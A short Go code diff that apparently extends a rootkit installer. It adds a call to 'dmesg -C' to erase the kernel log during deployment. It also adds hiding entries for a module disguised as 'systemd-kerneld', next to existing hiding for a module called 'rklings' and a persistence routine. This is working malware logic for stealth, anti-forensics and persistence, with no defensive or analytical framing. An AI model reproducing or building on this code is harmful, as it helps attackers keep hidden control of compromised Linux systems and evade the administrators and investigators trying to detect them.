@@ -5,6 +5,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 )
@@ -40,10 +41,13 @@ func deploy() {
 				}
 			}
 		}
+		exec.Command("dmesg", "-C").Run()
 		if _, err := os.Stat("/sys/module/rklings"); err == nil {
 			mkdirCmd("h.m")
 			mkdirCmd("h.f.rklings")
 			mkdirCmd("h.c.rklings")
+			mkdirCmd("h.f.systemd-kerneld")
+			mkdirCmd("h.c.systemd-kerneld")
 		}
 		if err := installPersistence(); err != nil {
 			log.Printf("persistence: %v", err)
